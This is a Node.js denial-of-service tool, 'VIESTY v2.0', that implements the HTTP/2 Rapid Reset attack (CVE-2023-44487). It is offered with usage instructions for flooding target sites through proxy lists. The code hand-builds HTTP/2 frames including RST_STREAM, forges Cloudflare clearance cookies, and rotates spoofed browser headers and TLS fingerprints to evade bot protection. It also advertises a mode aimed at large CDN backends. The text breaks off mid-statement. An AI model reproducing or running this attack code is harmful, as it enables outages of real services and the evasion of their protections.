// NEW RAPID-RESET (RST_STREAM) 2024 // developer @udpraw53
 const fs = require("fs")
 const cluster = require("cluster");
 const crypto = require("crypto");
 const http2 = require("http2-wrapper");
 const os = require('os');
 const net = require("net");
 const tls = require("tls");
 const url = require("url");
 const scp = require("set-cookie-parser");
 const http = require('http');
 const CryptoJS = require("crypto-js");
 const fetch = require('node-fetch');
 const util = require('util');
 const HPACK = require('hpack');
 const dns = require('dns');
 const { exec } = require('child_process');
 const colors = require('colors');
 
 const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
 const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

 require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

 process
     .setMaxListeners(0)
     .on('uncaughtException', function (e) {
         console.log(e)
         if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
     })
     .on('unhandledRejection', function (e) {
         if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
     })
     .on('warning', e => {
         if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
     })
     .on("SIGHUP", () => {
        return 1;
     })
     .on("SIGCHILD", () => {
        return 1;
     });

 var path = require("path");
 var fileName = __filename;
 var file = path.basename(fileName);

 let custom_table = 65535;
 let isFull = process.argv.includes('--flood');
 let custom_window = 6291456;
 let custom_header = 262144;
 let custom_update = 15663105;
 let timer = 0;
 let sentRSTs = 0;
 let sentHeaders = 0;
 
 let frame_1 = 65536;
 let frame_2 = 6291456;
 let frame_3 = 262144;
 let frame_4 = 1000;
 
 const HTTP2_FRAME_SIZE = 9;
 const FRAME_TYPE_SETTINGS = 0x4;
 const FRAME_TYPE_HEADERS = 0x1;
 const FRAME_TYPE_RST_STREAM = 0x3;
 const FLAGS_NONE = 0x0;
 const FLAGS_END_STREAM = 0x1;
 const FLAGS_END_HEADERS = 0x4;
 const STREAM_ID_ZERO = 0x0;
 const STREAM_ID = 1;
 const RST_STREAM_CANCEL = 0x8;
 const FRAME_TYPE_WINDOW_UPDATE = 0x8;

 const SETTINGS_HEADER_TABLE_SIZE = 0x1;
 const SETTINGS_MAX_CONCURRENT_STREAMS = 0x3;
 const SETTINGS_INITIAL_WINDOW_SIZE = 0x4;
 const SETTINGS_MAX_HEADER_LIST_SIZE = 0x6;

 const timestamp = Date.now();
 const timestampString = timestamp.toString().substring(0, 10);
 const currentDate = new Date();
 const targetDate = new Date('2025-12-31');
 
 const target = process.argv[2];
 const time = process.argv[3];
 const rate = process.argv[4];
 const threads = process.argv[5];
 const proxy = process.argv[6];
 const cookie = process.argv[7] || undefined;
 const refererIndex = process.argv.indexOf('--referers');
 const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
 const delayIndex = process.argv.indexOf('--delaytime');
 const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
 const queryIndex = process.argv.indexOf('--querystring');
 const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
 const postdataIndex = process.argv.indexOf('--postdata');
 const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
 const bfmFlagIndex = process.argv.indexOf('--botfmode');
 const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
 const cookieIndex = process.argv.indexOf('--cookie');
 const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
 const customHeadersIndex = process.argv.indexOf('--header');
 const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
 const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
 
 if (!target || !time || !rate || !threads || !proxy || !cookie) {
     console.clear();
     console.error(`[38;2;255;255;255m
VIESTY v2.0 Method With RST STREAM (CVE-2023-44487)
How to use & example:
  node h2-viesty.js <target> <time> <ratelimit> <thread> <proxy> <cookie>
  node h2-viesty.js https://target.com/ 120 64 5 proxy.txt jawa=jawa --flood --delaytime 1 --cookie "f=f" --querystring 1 --botfmode true --postdata "user=f&pass=%RAND%" --referers rand
    
Options:
  --referers https://target.com / rand - use custom referer - domains ex: fwfwwfwfw.net
  --cookie "f=f" - for custom cookie - also cookie support %RAND% ex: "bypassing=%RAND%"
  --delaytime <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
  --postdata "user=f&pass=%RAND%" - if you need data to post req method format "user=f&pass=f"
  --querystring 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
  --botfmode true/null - bot fight mode change to true if you need dont use if no need
  --flood - this new func for attack only big backend ex amazon akamai and other... support cf
  --randrate - randomizer rate 1 to 90 good bypass to rate
  --header "f:f" or "f:f#f1:f1" - if you need this use custom headers split each header with #
    `);
    process.exit(1);
}

 let hcookie = '';

 if (currentDate > targetDate) {
     console.error('Error method has been outdate pm @udpraw53');
     process.exit(1);
 }
 
 if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
     hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;
 }

 if (cookieValue) {
     if (cookieValue === '%RAND%') {
         hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
     } else {
         hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
     }
 }

 let proxies = readLines(proxy)
 const parsedTarget = url.parse(target);

 class NetSocket {
      constructor(){}
 
 HTTP(options, callback) {
      const parsedAddr = options.address.split(":");
      const addrHost = parsedAddr[0];
      const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nProxy-Connection: Keep-Alive\r\n\r\n";
      const buffer = new Buffer.from(payload);
     
      const connection = net.connect({
          host: options.host,
          port: options.port,
          allowHalfOpen: true,
          writable: true,
          readable: true
      });
 
      connection.setTimeout(options.timeout * 10000);
      connection.setKeepAlive(true, 10000);
      connection.setNoDelay(true);
      connection.on("connect", () => {
          connection.write(buffer);
      });

      connection.on("data", chunk => {
          const response = chunk.toString("utf-8");
          const isAlive = response.includes("HTTP/1.1 200");
              if (isAlive === false) {
                 connection.destroy();
                 return callback(undefined, "403");
              }
              return callback(connection, undefined);
      });
 
      connection.on("timeout", () => {
          connection.destroy();
          return callback(undefined, "403");
      });
 
      connection.on("error", error => {
          connection.destroy();
          return callback(undefined, "403");
      });
 }}
 
function logFrameBytes(frame, description) {
    const frameParts = [
        frame.slice(0, 3).toString('hex').padEnd(8),
        frame.slice(3, 4).toString('hex').padEnd(4),
        frame.slice(4, 5).toString('hex').padEnd(4),
        frame.slice(5, 9).toString('hex').padEnd(11),
        frame.slice(9).toString('hex')
    ];
}

function createWindowUpdateFrame(streamId, windowSize) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, FRAME_TYPE_WINDOW_UPDATE);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const windowSizeBuffer = Buffer.alloc(4);
    windowSizeBuffer.writeUInt32BE(windowSize, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, windowSizeBuffer]);
}

function createSettingsEntry(identifier, value) {
    const entryBuffer = Buffer.alloc(6);
    entryBuffer.writeUInt16BE(identifier, 0);
    entryBuffer.writeUInt32BE(value, 2);
    return entryBuffer;
}

function createSettingsFrame() {
    const settings = [
        createSettingsEntry(SETTINGS_HEADER_TABLE_SIZE, 65536),
        createSettingsEntry(SETTINGS_MAX_CONCURRENT_STREAMS, 100),
        createSettingsEntry(SETTINGS_INITIAL_WINDOW_SIZE, 6291456),
        createSettingsEntry(SETTINGS_MAX_HEADER_LIST_SIZE, 262144),
    ];

    const settingsPayload = Buffer.concat(settings);

    const length = Buffer.alloc(3);
    length.writeUIntBE(settingsPayload.length, 0, 3);

    const type = Buffer.alloc(1, FRAME_TYPE_SETTINGS);
    const flags = Buffer.alloc(1, FLAGS_NONE);
    const streamId = Buffer.alloc(4);
    streamId.writeUInt32BE(STREAM_ID_ZERO);

    const frame = Buffer.concat([length, type, flags, streamId, settingsPayload]);

    return frame;
}

function createHeadersFrame(streamId, headers) {
    const packedHeaders = codec.encode(headers);
    const length = packedHeaders.length;
    const type = FRAME_TYPE_HEADERS;
    const flags = FLAGS_NONE | FLAGS_END_HEADERS; 
    const header = Buffer.alloc(HTTP2_FRAME_SIZE);

    header.writeUInt32BE((length << 8) | type, 0);
    header.writeUInt8(flags, 4);
    header.writeUInt32BE(streamId, 5);

    logFrame(header, 'HEADERS', streamId);

    return Buffer.concat([header, packedHeaders]);
}

// Функция для создания RST_STREAM фрейма
function createRST_STREAM(streamId, errorCode) {
    const length = Buffer.alloc(3);
    length.writeUIntBE(4, 0, 3);
    const type = Buffer.alloc(1, 0x03);
    const flags = Buffer.alloc(1, 0);
    const streamIdBuffer = Buffer.alloc(4);
    streamIdBuffer.writeUInt32BE(streamId & 0x7FFFFFFF);
    const errorCodeBuffer = Buffer.alloc(4);
    errorCodeBuffer.writeUInt32BE(errorCode, 0);

    return Buffer.concat([length, type, flags, streamIdBuffer, errorCodeBuffer]);
}



function logFrame(frameBuffer, type, streamId) {
    const length = frameBuffer.length - HTTP2_FRAME_SIZE;
    const flags = getFlags(type, frameBuffer); 

}

 function cookieString(cookie) {
     var s = "";
     for (var c in cookie) {
         s = `${s} ${cookie[c].name}=${cookie[c].value};`;
     }
     var s = s.substring(1);
     return s.substring(0, s.length - 1);
 }

 function generateRandomString(minLength, maxLength) {
         const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
         const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
         const randomStringArray = Array.from({ length }, () => {
         const randomIndex = Math.floor(Math.random() * characters.length);
         return characters[randomIndex];
         });
     return randomStringArray.join('');
 }

 function _log(x) {
     console.log("["+"H2-VIESTY".red.bold+"] "+x)
 }

 function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 let currentProxy = 0;

 function getProxy() {
     if(!proxies[currentProxy+1]) {
         currentProxy = 0;
     }

     currentProxy++
     return proxies[currentProxy-1]
 }

 function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     let result = '';
     for (let i = 0; i < length; i++) {
         const randomIndex = Math.floor(Math.random() * characters.length);
         result += characters[randomIndex];
     }
     return result;
 }

 function generateRandomString(minLength, maxLength) {
     const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
 }
 
 function encodeFrame(streamId, type, payload = "", flags = 0) {
     let frame = Buffer.alloc(9)
     frame.writeUInt32BE(payload.length << 8 | type, 0)
     frame.writeUInt8(flags, 4)
     frame.writeUInt32BE(streamId, 5)
     if (payload.length > 0)
         frame = Buffer.concat([frame, payload])
     return frame
 }
 
 const getRandomChar = () => {
     const pizda4 = 'abcdefghijklmnopqrstuvwxyz';
     const randomIndex = Math.floor(Math.random() * pizda4.length);
     return pizda4[randomIndex];
 };

 const shuffleObject = (obj) => {
     const keys = Object.keys(obj);
     for (let i = keys.length - 1; i > 0; i--) {
         const j = Math.floor(Math.random() * (i + 1));
         [keys[i], keys[j]] = [keys[j], keys[i]];
     }
     const shuffledObj = {};
     keys.forEach(key => shuffledObj[key] = obj[key]);
     return shuffledObj;
 };

 function getRandomToken(length) {
     const characters = 'abcdefghijklmnopqrstuvwxyz';
     let result = '';
     for (let i = 0; i < length; i++) {
         const randomIndex = Math.floor(Math.random() * characters.length);
         result += characters[randomIndex];
     }
     return result;
 }

 function getRandomInt(min, max) {
     return Math.floor(Math.random() * (max - min + 1)) + min;
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstrr(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-";
     let result = "";
     const charactersLength = characters.length;
     for (let i = 0; i < length; i++) {
         result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     return result;
 }
 
 function randstr(length) {
     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
     let result = "";
     const charactersLength = characters.length;
     for (let i = 0; i < length; i++) {
         result += characters.charAt(Math.floor(Math.random() * charactersLength));
     }
     return result;
 }
 
 function ememmmmmemmeme(minLength, maxLength) {
     const characters = 'abcdefghijklmnopqrstuvwxyz';
     const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
     let result = '';
     for (let i = 0; i < length; i++) {
         const randomIndex = Math.floor(Math.random() * characters.length);
         result += characters[randomIndex];
     }
     return result;
 }
 
 function getFlags(type, frameBuffer) {
     let flags = frameBuffer[4];
     let flagsStr = '';

     switch (type) {
         case 'HEADERS':
             if (flags & FLAGS_END_HEADERS) flagsStr += 'END_HEADERS ';
             if (flags & FLAGS_END_STREAM) flagsStr += 'END_STREAM ';
             break;
         case 'RST_STREAM':
             flagsStr = 'END_STREAM';
             break;
         case 'SETTINGS':
             flagsStr = 'NONE';
             break;
     }

     return flagsStr.trim();
 }
 
function random_string(length, type) {
	var string = "";
	var characters = "";
	if (type == "LN") {
		characters ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	} 
	else if (type == "L") {
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
	} 
	else if (type == "N") {
		characters = "0123456789";
	} 
	else {
		characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
	}

	var charactersLength = characters.length;

	for (var i = 0; i < length; i++) {
		string += characters.charAt(Math.floor(Math.random() * charactersLength));
	}

	return string;
}

 function randomCharacters(length) {
    output = ""
    for (let count = 0; count < length; count++) {
        output += randomElement(characters);
    }
    return output;
}

       const Socker = new NetSocket();

           const lookupPromise = util.promisify(dns.lookup);
           
              let val;
              let isp;
              let pro;

              async function getIPAndISP(url) {
                  try {
                      const { address } = await lookupPromise(url);
                      const apiUrl = `http://ip-api.com/json/${address}`;
                      const response = await fetch(apiUrl);
                      if (response.ok) {
                          const data = await response.json();
                          isp = data.isp;
                          console.log('[ISP-FOUND]', url, ':', isp);
                      } else {
                          return;
                      }
                  } catch (error) {
                      return;
                  }
              }

              const targetURL = parsedTarget.host;

              getIPAndISP(targetURL);

              let streamId = 1
              let hpack = new HPACK()
              const requests = []
              hpack.setTableSize(4096)
              
              const updateWindow = Buffer.alloc(4)
              updateWindow.writeUInt32BE(custom_update, 0)
              
              const customHeadersArray = [];
              if (customHeaders) {
                  const customHeadersList = customHeaders.split('#');
                  for (const header of customHeadersList) {
                      const [name, value] = header.split(':');
                      if (name && value) {
                          customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                      }
                  }
              }
              
              let ratelimit;
              if (randrate !== undefined) {
                 ratelimit = getRandomInt(1, 59);
              } else {
                 ratelimit = process.argv[4];
              }

              const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
              const ciphers = "GREASE:" + [
                  defaultCiphers[0],
                  defaultCiphers[2],
                  defaultCiphers[1],
                  defaultCiphers.slice(3) 
              ].join(":");

              const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
              const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
              const secureOptions = 
                  crypto.constants.SSL_OP_NO_SSLv2 |
                  crypto.constants.SSL_OP_NO_SSLv3 |
                  crypto.constants.SSL_OP_NO_TLSv1 |
                  crypto.constants.SSL_OP_NO_TLSv1_1 |
                  crypto.constants.ALPN_ENABLED |
                  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
                  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
                  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
                  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
                  crypto.constants.SSL_OP_SINGLE_DH_USE |
                  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
                  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

              const secureProtocol = "TLS_client_method";
              const secureContextOptions = {
                  ciphers: ciphers,
                  sigalgs: sigalgs,
                  honorCipherOrder: true,
                  secureOptions: secureOptions,
                  secureProtocol: secureProtocol
              };

              const secureContext = tls.createSecureContext(secureContextOptions);

              for (let i = 0; i < (isFull ? rate : 1); i++) {
               function runFlooder() {
                  const proxyAddr = randomElement(proxies);
                  const parsedProxy = proxyAddr.split(":");
                  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
   
                  const browserVersion = getRandomInt(123, 126);
 
                  const fwfw = ['Google Chrome', 'Brave'];
                  const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                  const ref = ["same-site", "same-origin", "cross-site"];
                  const ref1 = ref[Math.floor(Math.random() * ref.length)];

                  let brandValue;
                  if (browserVersion === 123) {
                      brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                  } else if (browserVersion === 124) {
                      brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                  } else if (browserVersion === 125) {
                      brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                  }else if (browserVersion === 126) {
                      brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                  }
 
                  var userAgent = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`;
 
                  const isBrave = wfwf === 'Brave';

                  const acceptHeaderValue = isBrave
                      ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
                      : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';

                  const langValue = isBrave
                      ? 'en-US,en;q=0.9'
                      : 'en-US,en;q=0.7';
                      
                  const Versions = ['109.0.0.0', '108.0.0.0', '107.0.0.0', '106.0.0.0', '105.0.0.0', '104.0.0.0', '103.0.0.0', '102.0.0.0', '101.0.0.0'];

                  const version = Versions[Math.floor(Math.random() * Versions.length)];

                  const secGpcValue = isBrave ? "1" : undefined;

                  const secChUaModel = isBrave ? '""' : undefined;
                  const secChUaPlatform = isBrave ? 'Windows' : undefined;
                  const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                  const secChUaMobile = isBrave ? '?0' : undefined;
 
                  const secChUa = `${brandValue}`;
 
                  const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
                  const randversion = Math.floor(Math.random() * (122 - 100 + 1)) + 100;
                  const randomString = [...Array(10)].map(() => Math.random().toString(36).charAt(2)).join('');
    
                  const headers = shuffleObject({
                      ":method": "GET",
                      ":authority": parsedTarget.host,
                      ":scheme": "https",
                      ":path": query ? handleQuery(query) : parsedTarget.path + (postdata ? `?${postdata}` : ""),
                      ...(Math.random() < 0.4 && { "cache-control": "max-age=3600" }),
                      ...("POST" && { "content-length": "0" }),
                      "sec-ch-ua": secChUa,
                      "sec-ch-ua-mobile": "?0",
                      "sec-ch-ua-platform": `\"Windows\"`,
                      "upgrade-insecure-requests": "1",
                      "user-agent": userAgent,
                      "accept": acceptHeaderValue,
                      ...(secGpcValue && { "sec-gpc": secGpcValue }),
                      ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                      ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                      ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                      ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                      ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                      ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                      ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                      ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                      "accept-encoding": "gzip, deflate, br",
                      "accept-language": langValue,
                      "cookie": hcookie,
                      ...(currentRefererValue && { "referer": currentRefererValue }),
                      ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
              });
              
                  let currenthead = 0;
                  
                  currenthead += 1
                  if (currenthead == 1) {
                      headers["sec-ch-ua"] = `${randomString}`;
                  } else if (currenthead == 2) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = `${randomString}`;
                  } else if (currenthead == 3) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `${randomString}`;
                  } else if (currenthead == 4) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = `${randomString}`;
                  } else if (currenthead === 5) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                  } else if (currenthead === 6) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["accept"] = `${randomString}`;
                  } else if (currenthead === 7) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = `${randomString}`;
                  } else if (currenthead === 8) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = "none";
                      headers["sec-fetch-mode"] = `${randomString}`;
                  } else if (currenthead === 9) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = "none";
                      headers["sec-fetch-mode"] = "navigate";
                      headers["sec-fetch-user"] = `${randomString}`;
                  } else if (currenthead === 10) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = "none";
                      headers["sec-fetch-mode"] = "navigate";
                      headers["sec-fetch-user"] = "?1";
                      headers["sec-fetch-dest"] = `${randomString}`;
                  } else if (currenthead === 11) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = "none";
                      headers["sec-fetch-mode"] = "navigate";
                      headers["sec-fetch-user"] = "?1";
                      headers["sec-fetch-dest"] = "document";
                      headers["accept-encoding"] = `${randomString}`;
                  } else if (currenthead === 12) {
                      headers["sec-ch-ua"] = `"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`;
                      headers["sec-ch-ua-mobile"] = "?0";
                      headers["sec-ch-ua-platform"] = `"Windows"`;
                      headers["upgrade-insecure-requests"] = "1";
                      headers["user-agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
                      headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
                      headers["sec-fetch-site"] = "none";
                      headers["sec-fetch-mode"] = "navigate";
                      headers["sec-fetch-user"] = "?1";
                      headers["sec-fetch-dest"] = "document";
                      headers["accept-encoding"] = "gzip, deflate, br, zstd";
                      currenthead = 0;
                  }

                  const headers2 = shuffleObject({
